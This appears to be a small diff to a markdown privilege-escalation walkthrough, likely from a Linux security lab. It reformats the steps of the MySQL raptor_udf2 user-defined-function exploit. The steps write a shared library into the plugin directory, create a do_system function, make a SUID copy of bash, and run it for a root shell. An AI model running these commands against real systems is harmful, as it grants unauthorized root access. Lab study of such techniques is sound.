@@ -10,13 +10,15 @@
 - Connect to the mysql service as the root user with a blank or known password.
 `mysql -u root`
 - Execute the following commands on the mysql shell to create a udf "do_system" using the compiled exploit
-`use mysql;`
-`create table foo(line blob);`
-`insert into foo values (load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
-`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
-`create function do_system returns integer soname 'raptor_udf2.so';`
+```
+use mysql;
+create table foo(line blob);
+insert into foo values (load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+```
 - Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission
-`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
 - Exit out of the mysql shell
 `\q`
 - Run /tmp/rootbash with -p to gain a root shell
